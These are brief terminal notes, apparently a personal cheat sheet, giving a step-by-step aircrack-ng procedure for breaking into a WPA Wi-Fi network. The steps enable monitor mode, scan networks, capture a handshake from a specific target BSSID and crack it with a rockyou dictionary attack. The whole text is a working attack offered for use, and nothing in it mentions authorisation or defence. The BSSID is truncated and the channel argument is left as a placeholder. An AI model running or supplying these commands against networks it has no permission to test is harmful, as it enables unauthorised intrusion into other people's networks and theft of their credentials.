step 1:
check wifi adapters & start in monitor mode
=> iwconfig
=> sudo su
=> airmon-ng start wlan0
step 2 :
scan nearby networks
=> airodump-ng wlan0
step 3:
capture handshake (passward hash)
note the bssid of target network (6c:4f:98:14:69) and channel no(4)
=> airodump-ng -c ch --bssid 6c:4f:98:14:69 -w capture wlan0
step 4: 
crack passward using dictionary attack
=> aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 6c:4f:98:14:69 capture-01.cap
